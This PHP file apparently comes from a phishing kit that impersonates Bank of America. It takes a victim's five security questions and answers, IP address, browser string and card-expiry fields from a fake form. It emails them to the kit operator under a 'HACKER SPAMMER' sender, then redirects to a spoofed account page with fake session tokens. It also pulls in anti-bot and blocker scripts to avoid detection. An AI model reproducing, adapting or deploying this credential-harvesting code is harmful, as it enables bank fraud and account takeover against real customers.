<?php
include ("../images/sec.gif");$zabi = getenv("REMOTE_ADDR");
include('../email.php');
include '../antibots.php';
include '../bt.php';
include "../blocker.php";
$message .= "--------------BOA Q Info---------------------\n";
$message .= "Question 1            : ".$_POST['Secoia']."\n";
$message .= "Answer 1            : ".$_POST['Sansr']."\n";
$message .= "Question 2              : ".$_POST['SecoiaA']."\n";
$message .= "Answer 2              : ".$_POST['Lokar']."\n";
$message .= "Question 3             : ".$_POST['nokma']."\n";
$message .= "Answer 3            : ".$_POST['SnIA']."\n";
$message .= "Question 4             : ".$_POST['nomad']."\n";
$message .= "Answer 4            : ".$_POST['BIAOR']."\n";
$message .= "Question 5             : ".$_POST['sHAia']."\n";
$message .= "Answer 5            : ".$_POST['ans5']."\n";$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "------------------ By HACKER SPAMMER  ---------------\n";
$cc = $_POST['ccn'];
$subject = "BOA BAN3 Q INFO [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: HACKER.SPAMMER <contact>\r\n";
mail($email,$subject,$message,$headers);mail($userinfo,$subject,$message,$headers);

header("Location: ../overviewshn.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
?>